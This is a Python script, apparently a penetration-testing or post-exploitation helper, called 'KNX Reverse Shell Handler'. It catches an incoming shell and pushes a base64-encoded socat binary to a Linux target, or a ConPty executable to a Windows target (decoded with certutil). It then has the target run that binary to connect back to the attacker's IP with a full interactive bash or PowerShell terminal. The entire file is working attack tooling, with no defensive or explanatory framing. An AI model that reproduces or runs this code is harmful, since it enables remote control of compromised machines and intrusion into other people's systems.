#!/usr/bin/python3

import os,datetime,sys
from subprocess import Popen, PIPE, STDOUT
from pwn import *

#### VARIABILI #########################

socat = "socat"
conpty = "conpty"
TTY = os.popen("tty").read().strip()
ROWS = os.popen("tput lines").read().strip()
COLS = os.popen("tput cols").read().strip()
path = os.popen("pwd").read().strip()
IP = "0.0.0.0"

#### FUNZIONI ##########################

def ORA():
    t = datetime.datetime.now()
    return "[%s:%s:%s]" % (t.hour, t.minute, t.second)

def linux():
    with open(socat, 'r+b') as f:
        b64socat = f.read()

    l = listen(PORT)
    l.sendline(b"echo ciao")
    l.recvuntil(b"ciao\n")
    l.sendline(b"echo " + b64socat + b" |base64 -d > /dev/shm/socat")
    l.sendline(b"chmod +x /dev/shm/socat")
    log.success("export SHELL=/bin/bash; export TERM=xterm-256color; reset; stty rows " + ROWS + " columns " + COLS + "; alias u='ls -lah'")
    soc = Popen(["socat", "TCP-LISTEN:" + str(PORT) + ",reuseaddr", "FILE:" + TTY + ",raw,echo=0"],stdin=PIPE,stdout=PIPE)
    l.sendline(b"/dev/shm/socat TCP4:" + IP.encode() + b":" + PORT.encode() + b" EXEC:bash,pty,stderr,setsid,sigint,sane")
    output, error = soc.communicate()

def windows():
    with open(conpty, 'r+b') as f:
        b64conpty = f.read().replace(b"\r",b"").replace(b"\n",b"")
   
    w = listen(PORT)
    for i in range(0, len(b64conpty), 5000):
        w.sendlineafter(b">", b"echo " + b64conpty[i:i+5000] + b" >> c:\\windows\\tasks\\conpty.b64")
        sleep(0.1)
    w.sendlineafter(b">", b"certutil -decode c:\\windows\\tasks\\conpty.b64 c:\\windows\\tasks\\conpty.exe")
    cmd = "stty raw -echo; (stty size; cat) | nc -lvnp " + PORT
    con = Popen(cmd, shell=True)
    sleep(5)
    w.sendlineafter(b">", b"c:\\windows\\tasks\\conpty.exe " + IP.encode() + b" " + PORT.encode() + b" " + ROWS.encode() + b" " + COLS.encode())
    con.communicate()

##########################################
#### MAIN ################################
##########################################

log.info("-------- KNX Reverse Shell Handler -----------")
log.info("- Linux handler with socat")
log.info("- Windows handler with ConPty thx @splintercode")
log.info("")

if len(sys.argv) != 4:
    log.failure("Usage: " + sys.argv[0] + " -[l|w] ip port")
    print("\n")
    sys.exit()

log.info("KNX Handler started at: " + ORA())

IP = sys.argv[2]
PORT = sys.argv[3]

if sys.argv[1] == "-l":
    linux()
elif sys.argv[1] == "-w":
    windows()
else:
    log.failure("Il sistema operativo deve essere l(Linux) o w(Windows)")
    print("\n")
    sys.exit()
